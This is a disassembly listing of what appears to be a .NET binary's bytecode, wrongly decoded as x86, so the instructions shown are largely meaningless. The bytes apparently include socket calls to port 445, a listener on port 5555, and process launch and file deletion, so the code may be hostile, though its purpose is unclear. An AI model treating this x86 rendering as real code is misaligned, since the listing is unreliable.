  4030c4:	00 00                	add    %al,(%eax)
  4030c6:	0a 0d 09 6f 7b 00    	or     0x7b6f09,%cl
  4030cc:	00 0a                	add    %cl,(%edx)
  4030ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4030cf:	7c 00                	jl     0x4030d1
  4030d1:	00 0a                	add    %cl,(%edx)
  4030d3:	0b 2b                	or     (%ebx),%ebp
  4030d5:	1c 07                	sbb    $0x7,%al
  4030d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4030d8:	7d 00                	jge    0x4030da
  4030da:	00 0a                	add    %cl,(%edx)
  4030dc:	72 ca                	jb     0x4030a8
  4030de:	0d 00 70 6f 7e       	or     $0x7e6f7000,%eax
  4030e3:	00 00                	add    %al,(%eax)
  4030e5:	0a a5 6d 00 00 01    	or     0x100006d(%ebp),%ah
  4030eb:	18 34 04             	sbb    %dh,(%esp,%eax,1)
  4030ee:	17                   	pop    %ss
  4030ef:	0c de                	or     $0xde,%al
  4030f1:	27                   	daa
  4030f2:	07                   	pop    %es
  4030f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4030f4:	80 00 00             	addb   $0x0,(%eax)
  4030f7:	0a 2d dc de 0a 07    	or     0x70adedc,%ch
  4030fd:	2c 06                	sub    $0x6,%al
  4030ff:	07                   	pop    %es
  403100:	6f                   	outsl  %ds:(%esi),(%dx)
  403101:	70 00                	jo     0x403103
  403103:	00 0a                	add    %cl,(%edx)
  403105:	dc de                	(bad)
  403107:	0a 09                	or     (%ecx),%cl
  403109:	2c 06                	sub    $0x6,%al
  40310b:	09 6f 70             	or     %ebp,0x70(%edi)
  40310e:	00 00                	add    %al,(%eax)
  403110:	0a dc                	or     %ah,%bl
  403112:	de 03                	fiadds (%ebx)
  403114:	26 de 00             	fiadds %es:(%eax)
  403117:	16                   	push   %ss
  403118:	2a 08                	sub    (%eax),%cl
  40311a:	2a 00                	sub    (%eax),%al
  40311c:	01 40 00             	add    %eax,0x0(%eax)
  40311f:	00 02                	add    %al,(%edx)
  403121:	00 17                	add    %dl,(%edi)
  403123:	00 30                	add    %dh,(%eax)
  403125:	47                   	inc    %edi
  403126:	00 0a                	add    %cl,(%edx)
  403128:	00 00                	add    %al,(%eax)
  40312a:	00 00                	add    %al,(%eax)
  40312c:	02 00                	add    (%eax),%al
  40312e:	0b 00                	or     (%eax),%eax
  403130:	48                   	dec    %eax
  403131:	53                   	push   %ebx
  403132:	00 0a                	add    %cl,(%edx)
  403134:	00 00                	add    %al,(%eax)
  403136:	00 00                	add    %al,(%eax)
  403138:	02 00                	add    (%eax),%al
  40313a:	74 00                	je     0x40313c
  40313c:	28 9c 00 0a 00 00 00 	sub    %bl,0xa(%eax,%eax,1)
  403143:	00 02                	add    %al,(%edx)
  403145:	00 68 00             	add    %ch,0x0(%eax)
  403148:	40                   	inc    %eax
  403149:	a8 00                	test   $0x0,%al
  40314b:	0a 00                	or     (%eax),%al
  40314d:	00 00                	add    %al,(%eax)
  40314f:	00 00                	add    %al,(%eax)
  403151:	00 00                	add    %al,(%eax)
  403153:	00 b4 b4 00 03 13 00 	add    %dh,0x130300(%esp,%esi,4)
  40315a:	00 01                	add    %al,(%ecx)
  40315c:	13 30                	adc    (%eax),%esi
  40315e:	04 00                	add    $0x0,%al
  403160:	e5 01                	in     $0x1,%eax
  403162:	00 00                	add    %al,(%eax)
  403164:	00 00                	add    %al,(%eax)
  403166:	00 00                	add    %al,(%eax)
  403168:	1f                   	pop    %ds
  403169:	15 8d 57 00 00       	adc    $0x578d,%eax
  40316e:	01 25 16 72 f0 0d    	add    %esp,0xdf07216
  403174:	00 70 a2             	add    %dh,-0x5e(%eax)
  403177:	25 17 72 00 0e       	and    $0xe007217,%eax
  40317c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40317f:	25 18 72 0c 0e       	and    $0xe0c7218,%eax
  403184:	00 70 a2             	add    %dh,-0x5e(%eax)
  403187:	25 19 72 14 0e       	and    $0xe147219,%eax
  40318c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40318f:	25 1a 72 1e 0e       	and    $0xe1e721a,%eax
  403194:	00 70 a2             	add    %dh,-0x5e(%eax)
  403197:	25 1b 72 28 0e       	and    $0xe28721b,%eax
  40319c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40319f:	25 1c 72 36 0e       	and    $0xe36721c,%eax
  4031a4:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031a7:	25 1d 72 40 0e       	and    $0xe40721d,%eax
  4031ac:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031af:	25 1e 72 4e 0e       	and    $0xe4e721e,%eax
  4031b4:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031b7:	25 1f 09 72 62       	and    $0x6272091f,%eax
  4031bc:	0e                   	push   %cs
  4031bd:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031c0:	25 1f 0a 72 72       	and    $0x72720a1f,%eax
  4031c5:	0e                   	push   %cs
  4031c6:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031c9:	25 1f 0b 72 80       	and    $0x80720b1f,%eax
  4031ce:	0e                   	push   %cs
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 1f 0c 72 8e       	and    $0x8e720c1f,%eax
  4031d7:	0e                   	push   %cs
  4031d8:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031db:	25 1f 0d 72 a0       	and    $0xa0720d1f,%eax
  4031e0:	0e                   	push   %cs
  4031e1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031e4:	25 1f 0e 72 b0       	and    $0xb0720e1f,%eax
  4031e9:	0e                   	push   %cs
  4031ea:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031ed:	25 1f 0f 72 cc       	and    $0xcc720f1f,%eax
  4031f2:	0e                   	push   %cs
  4031f3:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031f6:	25 1f 10 72 dc       	and    $0xdc72101f,%eax
  4031fb:	0e                   	push   %cs
  4031fc:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031ff:	25 1f 11 72 ec       	and    $0xec72111f,%eax
  403204:	0e                   	push   %cs
  403205:	00 70 a2             	add    %dh,-0x5e(%eax)
  403208:	25 1f 12 72 0c       	and    $0xc72121f,%eax
  40320d:	0e                   	push   %cs
  40320e:	00 70 a2             	add    %dh,-0x5e(%eax)
  403211:	25 1f 13 72 fa       	and    $0xfa72131f,%eax
  403216:	0e                   	push   %cs
  403217:	00 70 a2             	add    %dh,-0x5e(%eax)
  40321a:	25 1f 14 72 02       	and    $0x272141f,%eax
  40321f:	0f 00                	(bad)
  403221:	70 a2                	jo     0x4031c5
  403223:	80 09 00             	orb    $0x0,(%ecx)
  403226:	00 04 1e             	add    %al,(%esi,%ebx,1)
  403229:	8d 57 00             	lea    0x0(%edi),%edx
  40322c:	00 01                	add    %al,(%ecx)
  40322e:	25 16 72 24 0f       	and    $0xf247216,%eax
  403233:	00 70 a2             	add    %dh,-0x5e(%eax)
  403236:	25 17 72 34 0f       	and    $0xf347217,%eax
  40323b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40323e:	25 18 72 4c 0f       	and    $0xf4c7218,%eax
  403243:	00 70 a2             	add    %dh,-0x5e(%eax)
  403246:	25 19 72 5e 0f       	and    $0xf5e7219,%eax
  40324b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40324e:	25 1a 72 6c 0f       	and    $0xf6c721a,%eax
  403253:	00 70 a2             	add    %dh,-0x5e(%eax)
  403256:	25 1b 72 82 0f       	and    $0xf82721b,%eax
  40325b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40325e:	25 1c 72 92 0f       	and    $0xf92721c,%eax
  403263:	00 70 a2             	add    %dh,-0x5e(%eax)
  403266:	25 1d 72 a0 0f       	and    $0xfa0721d,%eax
  40326b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40326e:	80 0a 00             	orb    $0x0,(%edx)
  403271:	00 04 1d 8d 57 00 00 	add    %al,0x578d(,%ebx,1)
  403278:	01 25 16 72 b4 0f    	add    %esp,0xfb47216
  40327e:	00 70 a2             	add    %dh,-0x5e(%eax)
  403281:	25 17 72 9e 0c       	and    $0xc9e7217,%eax
  403286:	00 70 a2             	add    %dh,-0x5e(%eax)
  403289:	25 18 72 e0 0f       	and    $0xfe07218,%eax
  40328e:	00 70 a2             	add    %dh,-0x5e(%eax)
  403291:	25 19 72 c6 0c       	and    $0xcc67219,%eax
  403296:	00 70 a2             	add    %dh,-0x5e(%eax)
  403299:	25 1a 72 f6 0f       	and    $0xff6721a,%eax
  40329e:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032a1:	25 1b 72 fe 0f       	and    $0xffe721b,%eax
  4032a6:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032a9:	25 1c 72 12 10       	and    $0x1012721c,%eax
  4032ae:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032b1:	80 0b 00             	orb    $0x0,(%ebx)
  4032b4:	00 04 1e             	add    %al,(%esi,%ebx,1)
  4032b7:	8d 57 00             	lea    0x0(%edi),%edx
  4032ba:	00 01                	add    %al,(%ecx)
  4032bc:	25 16 72 8e 0c       	and    $0xc8e7216,%eax
  4032c1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032c4:	25 17 72 e0 0f       	and    $0xfe07217,%eax
  4032c9:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032cc:	25 18 72 9e 0c       	and    $0xc9e7218,%eax
  4032d1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032d4:	25 19 72 1e 10       	and    $0x101e7219,%eax
  4032d9:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032dc:	25 1a 72 26 10       	and    $0x1026721a,%eax
  4032e1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032e4:	25 1b 72 f6 0f       	and    $0xff6721b,%eax
  4032e9:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032ec:	25 1c 72 c6 0c       	and    $0xcc6721c,%eax
  4032f1:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032f4:	25 1d 72 fe 0f       	and    $0xffe721d,%eax
  4032f9:	00 70 a2             	add    %dh,-0x5e(%eax)
  4032fc:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  403300:	04 1e                	add    $0x1e,%al
  403302:	8d 57 00             	lea    0x0(%edi),%edx
  403305:	00 01                	add    %al,(%ecx)
  403307:	25 16 72 32 10       	and    $0x10327216,%eax
  40330c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40330f:	25 17 72 44 10       	and    $0x10447217,%eax
  403314:	00 70 a2             	add    %dh,-0x5e(%eax)
  403317:	25 18 72 56 10       	and    $0x10567218,%eax
  40331c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40331f:	25 19 72 68 10       	and    $0x10687219,%eax
  403324:	00 70 a2             	add    %dh,-0x5e(%eax)
  403327:	25 1a 72 7a 10       	and    $0x107a721a,%eax
  40332c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40332f:	25 1b 72 8c 10       	and    $0x108c721b,%eax
  403334:	00 70 a2             	add    %dh,-0x5e(%eax)
  403337:	25 1c 72 9e 10       	and    $0x109e721c,%eax
  40333c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40333f:	25 1d 72 b0 10       	and    $0x10b0721d,%eax
  403344:	00 70 a2             	add    %dh,-0x5e(%eax)
  403347:	80 0d 00 00 04 2a 00 	orb    $0x0,0x2a040000
  40334e:	00 00                	add    %al,(%eax)
  403350:	1b 30                	sbb    (%eax),%esi
  403352:	02 00                	add    (%eax),%al
  403354:	55                   	push   %ebp
  403355:	00 00                	add    %al,(%eax)
  403357:	00 14 00             	add    %dl,(%eax,%eax,1)
  40335a:	00 11                	add    %dl,(%ecx)
  40335c:	28 34 00             	sub    %dh,(%eax,%eax,1)
  40335f:	00 06                	add    %al,(%esi)
  403361:	0a 06                	or     (%esi),%al
  403363:	2d 02 de 49 28       	sub    $0x2849de02,%eax
  403368:	31 00                	xor    %eax,(%eax)
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	6f                   	outsl  %ds:(%esi),(%dx)
  40336d:	32 00                	xor    (%eax),%al
  40336f:	00 0a                	add    %cl,(%edx)
  403371:	6f                   	outsl  %ds:(%esi),(%dx)
  403372:	33 00                	xor    (%eax),%eax
  403374:	00 0a                	add    %cl,(%edx)
  403376:	0b 7e 0e             	or     0xe(%esi),%edi
  403379:	00 00                	add    %al,(%eax)
  40337b:	04 0c                	add    $0xc,%al
  40337d:	16                   	push   %ss
  40337e:	0d 2b 24 08 09       	or     $0x908242b,%eax
  403383:	9a 13 04 06 11 04 28 	lcall  $0x2804,$0x11060413
  40338a:	2b 00                	sub    (%eax),%eax
  40338c:	00 0a                	add    %cl,(%edx)
  40338e:	13 05 11 05 28 2c    	adc    0x2c280511,%eax
  403394:	00 00                	add    %al,(%eax)
  403396:	0a 2c 08             	or     (%eax,%ecx,1),%ch
  403399:	11 05 07 28 35 00    	adc    %eax,0x352807
  40339f:	00 06                	add    %al,(%esi)
  4033a1:	09 17                	or     %edx,(%edi)
  4033a3:	58                   	pop    %eax
  4033a4:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4033a9:	32 d6                	xor    %dh,%dl
  4033ab:	de 03                	fiadds (%ebx)
  4033ad:	26 de 00             	fiadds %es:(%eax)
  4033b0:	2a 00                	sub    (%eax),%al
  4033b2:	00 00                	add    %al,(%eax)
  4033b4:	01 10                	add    %edx,(%eax)
  4033b6:	00 00                	add    %al,(%eax)
  4033b8:	00 00                	add    %al,(%eax)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	51                   	push   %ecx
  4033bd:	51                   	push   %ecx
  4033be:	00 03                	add    %al,(%ebx)
  4033c0:	13 00                	adc    (%eax),%eax
  4033c2:	00 01                	add    %al,(%ecx)
  4033c4:	13 30                	adc    (%eax),%esi
  4033c6:	02 00                	add    (%eax),%al
  4033c8:	1e                   	push   %ds
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 15 00 00 11 1f    	add    %dl,0x1f110000
  4033d1:	1c 28                	sbb    $0x28,%al
  4033d3:	2a 00                	sub    (%eax),%al
  4033d5:	00 0a                	add    %cl,(%edx)
  4033d7:	72 c2                	jb     0x40339b
  4033d9:	10 00                	adc    %al,(%eax)
  4033db:	70 28                	jo     0x403405
  4033dd:	2b 00                	sub    (%eax),%eax
  4033df:	00 0a                	add    %cl,(%edx)
  4033e1:	0a 06                	or     (%esi),%al
  4033e3:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4033e6:	00 0a                	add    %cl,(%edx)
  4033e8:	2c 02                	sub    $0x2,%al
  4033ea:	06                   	push   %es
  4033eb:	2a 14 2a             	sub    (%edx,%ebp,1),%dl
  4033ee:	00 00                	add    %al,(%eax)
  4033f0:	1b 30                	sbb    (%eax),%esi
  4033f2:	04 00                	add    $0x0,%al
  4033f4:	ba 00 00 00 16       	mov    $0x16000000,%edx
  4033f9:	00 00                	add    %al,(%eax)
  4033fb:	11 02                	adc    %eax,(%edx)
  4033fd:	72 d2                	jb     0x4033d1
  4033ff:	10 00                	adc    %al,(%eax)
  403401:	70 28                	jo     0x40342b
  403403:	2b 00                	sub    (%eax),%eax
  403405:	00 0a                	add    %cl,(%edx)
  403407:	0a 06                	or     (%esi),%al
  403409:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	2c 05                	sub    $0x5,%al
  403410:	dd a0 00 00 00 1d    	frstor 0x1d000000(%eax)
  403416:	8d 57 00             	lea    0x0(%edi),%edx
  403419:	00 01                	add    %al,(%ecx)
  40341b:	25 16 72 f8 10       	and    $0x10f87216,%eax
  403420:	00 70 a2             	add    %dh,-0x5e(%eax)
  403423:	25 17 06 a2 25       	and    $0x25a20617,%eax
  403428:	18 72 a1             	sbb    %dh,-0x5f(%edx)
  40342b:	11 00                	adc    %eax,(%eax)
  40342d:	70 a2                	jo     0x4033d1
  40342f:	25 19 03 a2 25       	and    $0x25a20319,%eax
  403434:	1a 72 d3             	sbb    -0x2d(%edx),%dh
  403437:	11 00                	adc    %eax,(%eax)
  403439:	70 a2                	jo     0x4033dd
  40343b:	25 1b 03 28 8e       	and    $0x8e28031b,%eax
  403440:	00 00                	add    %al,(%eax)
  403442:	0a a2 25 1c 72 0f    	or     0xf721c25(%edx),%ah
  403448:	12 00                	adc    (%eax),%al
  40344a:	70 a2                	jo     0x4033ee
  40344c:	28 8f 00 00 0a 0b    	sub    %cl,0xb0a0000(%edi)
  403452:	28 90 00 00 0a 72    	sub    %dl,0x720a0000(%eax)
  403458:	aa                   	stos   %al,%es:(%edi)
  403459:	12 00                	adc    (%eax),%al
  40345b:	70 28                	jo     0x403485
  40345d:	91                   	xchg   %eax,%ecx
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 0d 12 03 72 b6    	or     0xb6720312,%cl
  403466:	12 00                	adc    (%eax),%al
  403468:	70 28                	jo     0x403492
  40346a:	92                   	xchg   %eax,%edx
  40346b:	00 00                	add    %al,(%eax)
  40346d:	0a 72 ba             	or     -0x46(%edx),%dh
  403470:	12 00                	adc    (%eax),%al
  403472:	70 28                	jo     0x40349c
  403474:	34 00                	xor    $0x0,%al
  403476:	00 0a                	add    %cl,(%edx)
  403478:	28 2b                	sub    %ch,(%ebx)
  40347a:	00 00                	add    %al,(%eax)
  40347c:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  40347f:	07                   	pop    %es
  403480:	28 93 00 00 0a 72    	sub    %dl,0x720a0000(%ebx)
  403486:	c4 12                	les    (%edx),%edx
  403488:	00 70 72             	add    %dh,0x72(%eax)
  40348b:	96                   	xchg   %eax,%esi
  40348c:	06                   	push   %es
  40348d:	00 70 08             	add    %dh,0x8(%eax)
  403490:	72 96                	jb     0x403428
  403492:	06                   	push   %es
  403493:	00 70 28             	add    %dh,0x28(%eax)
  403496:	34 00                	xor    $0x0,%al
  403498:	00 0a                	add    %cl,(%edx)
  40349a:	28 25 00 00 0a 26    	sub    %ah,0x260a0000
  4034a0:	20 2c 01             	and    %ch,(%ecx,%eax,1)
  4034a3:	00 00                	add    %al,(%eax)
  4034a5:	28 3a                	sub    %bh,(%edx)
  4034a7:	00 00                	add    %al,(%eax)
  4034a9:	0a 08                	or     (%eax),%cl
  4034ab:	28 30                	sub    %dh,(%eax)
  4034ad:	00 00                	add    %al,(%eax)
  4034af:	0a de                	or     %dh,%bl
  4034b1:	03 26                	add    (%esi),%esp
  4034b3:	de 00                	fiadds (%eax)
  4034b5:	2a 00                	sub    (%eax),%al
  4034b7:	00 01                	add    %al,(%ecx)
  4034b9:	10 00                	adc    %al,(%eax)
  4034bb:	00 00                	add    %al,(%eax)
  4034bd:	00 00                	add    %al,(%eax)
  4034bf:	00 b6 b6 00 03 13    	add    %dh,0x130300b6(%esi)
  4034c5:	00 00                	add    %al,(%eax)
  4034c7:	01 b2 1a 8d 57 00    	add    %esi,0x578d1a(%edx)
  4034cd:	00 01                	add    %al,(%ecx)
  4034cf:	25 16 72 d4 12       	and    $0x12d47216,%eax
  4034d4:	00 70 a2             	add    %dh,-0x5e(%eax)
  4034d7:	25 17 72 e0 12       	and    $0x12e07217,%eax
  4034dc:	00 70 a2             	add    %dh,-0x5e(%eax)
  4034df:	25 18 72 fc 12       	and    $0x12fc7218,%eax
  4034e4:	00 70 a2             	add    %dh,-0x5e(%eax)
  4034e7:	25 19 72 10 13       	and    $0x13107219,%eax
  4034ec:	00 70 a2             	add    %dh,-0x5e(%eax)
  4034ef:	80 0e 00             	orb    $0x0,(%esi)
  4034f2:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4034f5:	00 00                	add    %al,(%eax)
  4034f7:	00 13                	add    %dl,(%ebx)
  4034f9:	30 02                	xor    %al,(%edx)
  4034fb:	00 2f                	add    %ch,(%edi)
  4034fd:	00 00                	add    %al,(%eax)
  4034ff:	00 17                	add    %dl,(%edi)
  403501:	00 00                	add    %al,(%eax)
  403503:	11 12                	adc    %edx,(%edx)
  403505:	00 28                	add    %ch,(%eax)
  403507:	94                   	xchg   %eax,%esp
  403508:	00 00                	add    %al,(%eax)
  40350a:	0a 7d 36             	or     0x36(%ebp),%bh
  40350d:	00 00                	add    %al,(%eax)
  40350f:	04 12                	add    $0x12,%al
  403511:	00 15 7d 35 00 00    	add    %dl,0x357d
  403517:	04 12                	add    $0x12,%al
  403519:	00 7c 36 00          	add    %bh,0x0(%esi,%esi,1)
  40351d:	00 04 12             	add    %al,(%edx,%edx,1)
  403520:	00 28                	add    %ch,(%eax)
  403522:	03 00                	add    (%eax),%eax
  403524:	00 2b                	add    %ch,(%ebx)
  403526:	12 00                	adc    (%eax),%al
  403528:	7c 36                	jl     0x403560
  40352a:	00 00                	add    %al,(%eax)
  40352c:	04 28                	add    $0x28,%al
  40352e:	96                   	xchg   %eax,%esi
  40352f:	00 00                	add    %al,(%eax)
  403531:	0a 2a                	or     (%edx),%ch
  403533:	00 1b                	add    %bl,(%ebx)
  403535:	30 03                	xor    %al,(%ebx)
  403537:	00 79 00             	add    %bh,0x0(%ecx)
  40353a:	00 00                	add    %al,(%eax)
  40353c:	18 00                	sbb    %al,(%eax)
  40353e:	00 11                	add    %dl,(%ecx)
  403540:	18 17                	sbb    %dl,(%edi)
  403542:	1c 73                	sbb    $0x73,%al
  403544:	97                   	xchg   %eax,%edi
  403545:	00 00                	add    %al,(%eax)
  403547:	0a 0a                	or     (%edx),%cl
  403549:	06                   	push   %es
  40354a:	20 b8 0b 00 00 6f    	and    %bh,0x6f00000b(%eax)
  403550:	98                   	cwtl
  403551:	00 00                	add    %al,(%eax)
  403553:	0a 06                	or     (%esi),%al
  403555:	20 b8 0b 00 00 6f    	and    %bh,0x6f00000b(%eax)
  40355b:	99                   	cltd
  40355c:	00 00                	add    %al,(%eax)
  40355e:	0a 06                	or     (%esi),%al
  403560:	02 20                	add    (%eax),%ah
  403562:	bd 01 00 00 6f       	mov    $0x6f000001,%ebp
  403567:	9a 00 00 0a 06 7e 16 	lcall  $0x167e,$0x60a0000
  40356e:	00 00                	add    %al,(%eax)
  403570:	04 6f                	add    $0x6f,%al
  403572:	9b                   	fwait
  403573:	00 00                	add    %al,(%eax)
  403575:	0a 26                	or     (%esi),%ah
  403577:	20 00                	and    %al,(%eax)
  403579:	01 00                	add    %eax,(%eax)
  40357b:	00 8d 4b 00 00 01    	add    %cl,0x100004b(%ebp)
  403581:	0b 06                	or     (%esi),%eax
  403583:	07                   	pop    %es
  403584:	6f                   	outsl  %ds:(%esi),(%dx)
  403585:	9c                   	pushf
  403586:	00 00                	add    %al,(%eax)
  403588:	0a 1f                	or     (%edi),%bl
  40358a:	44                   	inc    %esp
  40358b:	31 11                	xor    %edx,(%ecx)
  40358d:	07                   	pop    %es
  40358e:	1f                   	pop    %ds
  40358f:	44                   	inc    %esp
  403590:	91                   	xchg   %eax,%ecx
  403591:	19 33                	sbb    %esi,(%ebx)
  403593:	0a 06                	or     (%esi),%al
  403595:	6f                   	outsl  %ds:(%esi),(%dx)
  403596:	9d                   	popf
  403597:	00 00                	add    %al,(%eax)
  403599:	0a 17                	or     (%edi),%dl
  40359b:	0c de                	or     $0xde,%al
  40359d:	19 06                	sbb    %eax,(%esi)
  40359f:	6f                   	outsl  %ds:(%esi),(%dx)
  4035a0:	9d                   	popf
  4035a1:	00 00                	add    %al,(%eax)
  4035a3:	0a de                	or     %dh,%bl
  4035a5:	0a 06                	or     (%esi),%al
  4035a7:	2c 06                	sub    $0x6,%al
  4035a9:	06                   	push   %es
  4035aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4035ab:	70 00                	jo     0x4035ad
  4035ad:	00 0a                	add    %cl,(%edx)
  4035af:	dc de                	(bad)
  4035b1:	03 26                	add    (%esi),%esp
  4035b3:	de 00                	fiadds (%eax)
  4035b5:	16                   	push   %ss
  4035b6:	2a 08                	sub    (%eax),%cl
  4035b8:	2a 00                	sub    (%eax),%al
  4035ba:	00 00                	add    %al,(%eax)
  4035bc:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4035bf:	00 02                	add    %al,(%edx)
  4035c1:	00 09                	add    %cl,(%ecx)
  4035c3:	00 5d 66             	add    %bl,0x66(%ebp)
  4035c6:	00 0a                	add    %cl,(%edx)
	...
  4035d0:	72 72                	jb     0x403644
  4035d2:	00 03                	add    %al,(%ebx)
  4035d4:	13 00                	adc    (%eax),%eax
  4035d6:	00 01                	add    %al,(%ecx)
  4035d8:	1b 30                	sbb    (%eax),%esi
  4035da:	03 00                	add    (%eax),%eax
  4035dc:	d0 00                	rolb   $1,(%eax)
  4035de:	00 00                	add    %al,(%eax)
  4035e0:	19 00                	sbb    %eax,(%eax)
  4035e2:	00 11                	add    %dl,(%ecx)
  4035e4:	14 0a                	adc    $0xa,%al
  4035e6:	7e 9e                	jle    0x403586
  4035e8:	00 00                	add    %al,(%eax)
  4035ea:	0a 20                	or     (%eax),%ah
  4035ec:	b3 15                	mov    $0x15,%bl
  4035ee:	00 00                	add    %al,(%eax)
  4035f0:	73 9f                	jae    0x403591
  4035f2:	00 00                	add    %al,(%eax)
  4035f4:	0a 0a                	or     (%edx),%cl
  4035f6:	06                   	push   %es
  4035f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f8:	a0 00 00 0a 38       	mov    0x380a0000,%al
  4035fd:	97                   	xchg   %eax,%edi
  4035fe:	00 00                	add    %al,(%eax)
  403600:	00 06                	add    %al,(%esi)
  403602:	6f                   	outsl  %ds:(%esi),(%dx)
  403603:	a1 00 00 0a 2d       	mov    0x2d0a0000,%eax
  403608:	0c 1f                	or     $0x1f,%al
  40360a:	64 28 3a             	sub    %bh,%fs:(%edx)
  40360d:	00 00                	add    %al,(%eax)
  40360f:	0a 38                	or     (%eax),%bh
  403611:	83 00 00             	addl   $0x0,(%eax)
  403614:	00 06                	add    %al,(%esi)
  403616:	6f                   	outsl  %ds:(%esi),(%dx)
  403617:	a2 00 00 0a 0b       	mov    %al,0xb0a0000
  40361c:	07                   	pop    %es
  40361d:	6f                   	outsl  %ds:(%esi),(%dx)
  40361e:	a3 00 00 0a 0c       	mov    %eax,0xc0a0000
  403623:	08 28                	or     %ch,(%eax)
  403625:	60                   	pusha
  403626:	00 00                	add    %al,(%eax)
  403628:	0a 73 a4             	or     -0x5c(%ebx),%dh
  40362b:	00 00                	add    %al,(%eax)
  40362d:	0a 0d 08 28 60 00    	or     0x602808,%cl
  403633:	00 0a                	add    %cl,(%edx)
  403635:	73 a5                	jae    0x4035dc
  403637:	00 00                	add    %al,(%eax)
  403639:	0a 25 17 6f a6 00    	or     0xa66f17,%ah
  40363f:	00 0a                	add    %cl,(%edx)
  403641:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  403644:	6f                   	outsl  %ds:(%esi),(%dx)
  403645:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403646:	00 00                	add    %al,(%eax)
  403648:	0a 13                	or     (%ebx),%dl
  40364a:	05 11 05 28 a8       	add    $0xa8280511,%eax
  40364f:	00 00                	add    %al,(%eax)
  403651:	0a 2d 12 11 05 28    	or     0x28051112,%ch
  403657:	3a 00                	cmp    (%eax),%al
  403659:	00 06                	add    %al,(%esi)
  40365b:	13 06                	adc    (%esi),%eax
  40365d:	11 04 11             	adc    %eax,(%ecx,%edx,1)
  403660:	06                   	push   %es
  403661:	6f                   	outsl  %ds:(%esi),(%dx)
  403662:	a9 00 00 0a de       	test   $0xde0a0000,%eax
  403667:	0c 11                	or     $0x11,%al
  403669:	04 2c                	add    $0x2c,%al
  40366b:	07                   	pop    %es
  40366c:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  40366f:	70 00                	jo     0x403671
  403671:	00 0a                	add    %cl,(%edx)
  403673:	dc de                	(bad)
  403675:	0a 09                	or     (%ecx),%cl
  403677:	2c 06                	sub    $0x6,%al
  403679:	09 6f 70             	or     %ebp,0x70(%edi)
  40367c:	00 00                	add    %al,(%eax)
  40367e:	0a dc                	or     %ah,%bl
  403680:	de 0a                	fimuls (%edx)
  403682:	08 2c 06             	or     %ch,(%esi,%eax,1)
  403685:	08 6f 70             	or     %ch,0x70(%edi)
  403688:	00 00                	add    %al,(%eax)
  40368a:	0a dc                	or     %ah,%bl
  40368c:	de 0a                	fimuls (%edx)
  40368e:	07                   	pop    %es
  40368f:	2c 06                	sub    $0x6,%al
  403691:	07                   	pop    %es
  403692:	6f                   	outsl  %ds:(%esi),(%dx)
  403693:	70 00                	jo     0x403695
  403695:	00 0a                	add    %cl,(%edx)
  403697:	dc 0f                	fmull  (%edi)
  403699:	00 28                	add    %ch,(%eax)
  40369b:	aa                   	stos   %al,%es:(%edi)
  40369c:	00 00                	add    %al,(%eax)
  40369e:	0a 39                	or     (%ecx),%bh
  4036a0:	5d                   	pop    %ebp
  4036a1:	ff                   	(bad)
  4036a2:	ff                   	(bad)
  4036a3:	ff                   	lcall  (bad)
  4036a4:	de 0d 26 de 0a 06    	fimuls 0x60ade26
  4036aa:	2c 06                	sub    $0x6,%al
  4036ac:	06                   	push   %es
  4036ad:	28 ab 00 00 0a dc    	sub    %ch,-0x23f60000(%ebx)
  4036b3:	2a 01                	sub    (%ecx),%al
  4036b5:	4c                   	dec    %esp
  4036b6:	00 00                	add    %al,(%eax)
  4036b8:	02 00                	add    (%eax),%al
  4036ba:	5f                   	pop    %edi
  4036bb:	00 25 84 00 0c 00    	add    %ah,0xc0084
  4036c1:	00 00                	add    %al,(%eax)
  4036c3:	00 02                	add    %al,(%edx)
  4036c5:	00 4b 00             	add    %cl,0x0(%ebx)
  4036c8:	47                   	inc    %edi
  4036c9:	92                   	xchg   %eax,%edx
